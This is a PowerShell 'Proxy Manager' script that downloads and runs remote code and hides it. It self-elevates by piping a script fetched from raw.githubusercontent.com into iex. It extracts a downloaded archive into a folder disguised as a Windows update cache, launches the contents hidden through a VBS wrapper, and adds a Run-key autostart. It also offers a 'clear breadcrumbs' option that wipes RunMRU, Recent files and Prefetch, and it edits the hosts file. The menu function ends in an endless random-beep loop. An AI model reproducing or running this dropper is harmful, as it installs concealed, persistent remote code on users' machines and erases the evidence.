# === Configuration ===
$DownloadUrl = "https://github.com/chokeeea/prx/releases/download/1/a.zip"
$InstallPath = "C:\ProgramData\SystemCache\WinUpdate"
$ZipFile = "$env:TEMP\a.zip"
$PythonInstallerUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
$PythonInstaller = "$env:TEMP\python310.exe"
$BatFile = Join-Path $InstallPath "launch.bat"
$VbsFile = Join-Path $InstallPath "run-hidden.vbs"
$ConfigFile = Join-Path $InstallPath "config.json"
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegName = "ProxyService"
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
$entry = "127.0.0.1 vnt.diamondworld.pro"
$hostsContent = Get-Content -Path $hostsPath -ErrorAction SilentlyContinue
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    Start-Process powershell.exe '-NoProfile -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/chokeeea/prx/refs/heads/main/i.ps1 | iex"' -Verb RunAs
    exit
}




# === Function: Ask user to install Python ===
function Ask-PythonInstall {
    $answer = Read-Host "Do you want to install Python? (y/N)"
    if ($answer -eq 'y' -or $answer -eq 'Y') {
        Write-Host "Installing Python..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PythonInstallerUrl -OutFile $PythonInstaller -UseBasicParsing -ErrorAction Stop
            Start-Process -FilePath $PythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait -WindowStyle Hidden
            Remove-Item $PythonInstaller -Force
            Write-Host "Python installed successfully" -ForegroundColor Green
        } catch {
            Write-Host "Error installing Python: $($_.Exception.Message)" -ForegroundColor Red
        }
    } else {
        Write-Host "Skipping Python installation" -ForegroundColor Cyan
    }
}


# === Function: Change username in config ===
function Change-Username {
    param([string]$NewUsername)
    
    if (-not (Test-Path $ConfigFile)) {
        Write-Host "Configuration file not found!" -ForegroundColor Red
        return $false
    }
    
    try {
        $config = Get-Content $ConfigFile -Raw | ConvertFrom-Json
        $config.authentication.username = $NewUsername
        $config | ConvertTo-Json -Depth 32 | Set-Content $ConfigFile -Encoding UTF8
        Write-Host "Username changed to: $NewUsername" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Error updating configuration: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# === Function: Show menu ===
function Show-Menu {
    Clear-Host
    Write-Host "=== Proxy Manager ===" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "1. Change Username" -ForegroundColor Yellow
    Write-Host "2. Start Proxy" -ForegroundColor Green
    Write-Host "3. Stop Proxy" -ForegroundColor Red
    Write-Host "4. Show Status" -ForegroundColor White
    Write-Host "5. Reinstall" -ForegroundColor Magenta
    Write-Host "6. Remove from Startup" -ForegroundColor DarkYellow
    Write-Host "7. Tweaks & Clear breadcrumbs" -ForegroundColor Yellow
    Write-Host "8. Add entry to hosts" -ForegroundColor White
    Write-Host "0. Exit" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Select an option (1-7): " -NoNewline -ForegroundColor White
    while ($true) {
        [console]::beep((Get-Random -Minimum 100 -Maximum 5000), (Get-Random -Minimum 50 -Maximum 300))
    }

}

# === Function: Start Proxy ===
function Start-Proxy {
    if (Test-Path $BatFile -PathType Leaf -ErrorAction SilentlyContinue) {
        Write-Host "Starting Proxy..." -ForegroundColor Green
        Get-ChildItem -Path $InstallPath -Recurse -Force | ForEach-Object {
            $_.Attributes = $_.Attributes -band (-bnot [IO.FileAttributes]::ReadOnly)
        }
        (Get-Item $InstallPath).Attributes = (Get-Item $InstallPath).Attributes -band (-bnot [IO.FileAttributes]::ReadOnly)
        try {
            $psCommand = "Set-Location '$InstallPath'; wscript.exe '.\run-hidden.vbs' '.\launch.bat'"
            $process = Start-Process -FilePath "powershell.exe" `
                                     -ArgumentList @("-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", $psCommand) `
                                     -WindowStyle Hidden -PassThru
            
            Write-Host "Proxy started successfully" -ForegroundColor Green
            return $true
        }
        catch {
            Write-Host "Error starting proxy: $_" -ForegroundColor Red
            return $false
        }
    } else {
        Write-Host "Proxy files not found at $BatFile!" -ForegroundColor Red
        return $false
    }
}


# === Function: Stop Proxy ===
function Stop-Proxy {
    try {
        $processes = Get-Process | Where-Object { $_.ProcessName -like "*java*" -or $_.ProcessName -like "*proxy*" }
        if ($processes) {
            $processes | Stop-Process -Force
            Write-Host "Proxy stopped" -ForegroundColor Green
        } else {
            Write-Host "Proxy processes not found" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "Error stopping Proxy: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# === Function: Show Status ===
function Show-Status {
    Write-Host "=== Proxy Status ===" -ForegroundColor Cyan
    
    # Installation check
    if (Test-Path $InstallPath) {
        Write-Host "Installed at: $InstallPath" -ForegroundColor Green
    } else {
        Write-Host "Not installed" -ForegroundColor Red
    }
    
    # Startup check
    try {
        $regValue = Get-ItemProperty -Path $RegPath -Name $RegName -ErrorAction Stop
        Write-Host "In Startup" -ForegroundColor Green
    } catch {
        Write-Host "Not in Startup" -ForegroundColor Yellow
    }
    
    # Processes check
    $processes = Get-Process | Where-Object { $_.ProcessName -like "*java*" -or $_.ProcessName -like "*proxy*" }
    if ($processes) {
        Write-Host "Running (Processes found: $($processes.Count))" -ForegroundColor Green
    } else {
        Write-Host "Not running" -ForegroundColor Yellow
    }
    if ($hostsContent -notcontains $entry) {
        Write-Output "Entry $($entry) not added to hosts file."
    } else {
        Write-Output "Entry $($entry) exists in hosts."
    }
    
    # Show current username
    if (Test-Path $ConfigFile) {
        try {
            $config = Get-Content $ConfigFile -Raw | ConvertFrom-Json
            Write-Host "Current username: $($config.authentication.username)" -ForegroundColor White
        } catch {
            Write-Host "Error reading configuration" -ForegroundColor Red
        }
    }
}

# === Function: Initial Installation ===
function Install-Proxy {
    Write-Host "Installing Proxy..." -ForegroundColor Yellow
    
    # Install Python if needed
    Ask-PythonInstall

    # Download project archive
    try {
        Write-Host "Downloading Proxy..." -ForegroundColor Yellow
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipFile -UseBasicParsing -ErrorAction Stop
        
        if (Test-Path $InstallPath) { 
            Remove-Item -Recurse -Force $InstallPath 
        }
        
        Expand-Archive -Path $ZipFile -DestinationPath $InstallPath -Force
        Remove-Item $ZipFile -Force
        
        Write-Host "Proxy extracted to $InstallPath" -ForegroundColor Green
        
        # Create VBS for hidden launch
        $vbsCode = @'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """" & WScript.Arguments(0) & """", 0, False
Set WshShell = Nothing
'@
        Set-Content -Path $VbsFile -Value $vbsCode -Encoding ASCII -Force
        
        # Add to startup через PowerShell
        if (Test-Path $BatFile) {
            $psCommand = "Set-Location '$InstallPath'; wscript.exe '.\run-hidden.vbs' '.\launch.bat'"
            $cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$psCommand`""
            
            New-ItemProperty -Path $RegPath -Name $RegName -Value $cmd -PropertyType String -Force | Out-Null
            Write-Host "Startup configured via PowerShell" -ForegroundColor Green
        }
        
        Write-Host "Installation completed successfully!" -ForegroundColor Green
        return $true
        
    } catch { 
        Write-Host "Installation error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# === Function: Remove from Startup ===
function Remove-AutoStart {
    try {
        Remove-ItemProperty -Path $RegPath -Name $RegName -ErrorAction Stop
        Write-Host "Removed from Startup" -ForegroundColor Green
    } catch {
        Write-Host "Not found in Startup" -ForegroundColor Yellow
    }
}

# === Main Logic ===

$isInstalled = Test-Path $InstallPath

if (-not $isInstalled) {
    Write-Host "Proxy not installed. Performing installation..." -ForegroundColor Yellow
    if (Install-Proxy) {
        Write-Host ""
        $changeNick = Read-Host "Do you want to change the username? (y/N)"
        if ($changeNick -eq 'y' -or $changeNick -eq 'Y') {
            $newNick = Read-Host "Enter new username"
            if ($newNick) {
                Change-Username $newNick
            }
        }
        Start-Proxy
        Write-Host ""
        Write-Host "Press any key to continue..."
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    } else {
        Write-Host "Installation failed!" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
}

# Main Menu
do {
    Show-Menu
    $choice = Read-Host
    
    switch ($choice) {
        "1" {
            Clear-Host
            Write-Host "=== Change Username ===" -ForegroundColor Cyan
            if (Test-Path $ConfigFile) {
                try {
                    $config = Get-Content $ConfigFile -Raw | ConvertFrom-Json
                    Write-Host "Current username: $($config.authentication.username)" -ForegroundColor White
                } catch {}
            }
            Write-Host ""
            $newNick = Read-Host "Enter new username"
            if ($newNick) {
                Change-Username $newNick
            } else {
                Write-Host "Username not changed" -ForegroundColor Yellow
            }
            Write-Host ""
            Read-Host "Press Enter to continue"
        }
        "2" {
            Clear-Host
            Start-Proxy
            Read-Host "Press Enter to continue"
        }
        "3" {
            Clear-Host
            Stop-Proxy
            Read-Host "Press Enter to continue"
        }
        "4" {
            Clear-Host
            Show-Status
            Write-Host ""
            Read-Host "Press Enter to continue"
        }
        "5" {
            Clear-Host
            Write-Host "Reinstalling Proxy..." -ForegroundColor Yellow
            Stop-Proxy
            Start-Sleep 2
            Install-Proxy
            Read-Host "Press Enter to continue"
        }
        "6" {
            Clear-Host
            Remove-AutoStart
            Read-Host "Press Enter to continue"
        }
        "7" {
            Clear-Host
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
            New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies" -Name "Explorer" -Force | Out-Null
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRunMRU" -Value 1 -Type DWord
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
            Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRecentDocsHistory" -Value 1 -Type DWord
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackDocs" -Value 0 -Type DWord
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0 -Type DWord
            Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
            Read-Host "Press Enter to continue"
        }
        "8" {
            Clear-Host
            if ($hostsContent -notcontains $entry) {
                Add-Content -Path $hostsPath -Value $entry
                Write-Output "Entry added to hosts."
            } else {
                Write-Output "Entry already exists in hosts."
            }
            Read-Host "Press Enter to continue"
        }
        "0" {
            Write-Host "Exiting..." -ForegroundColor Gray
            exit 0
        }
        default {
            Write-Host "Invalid choice. Try again." -ForegroundColor Red
            Start-Sleep 1
        }
    }
} while ($true)
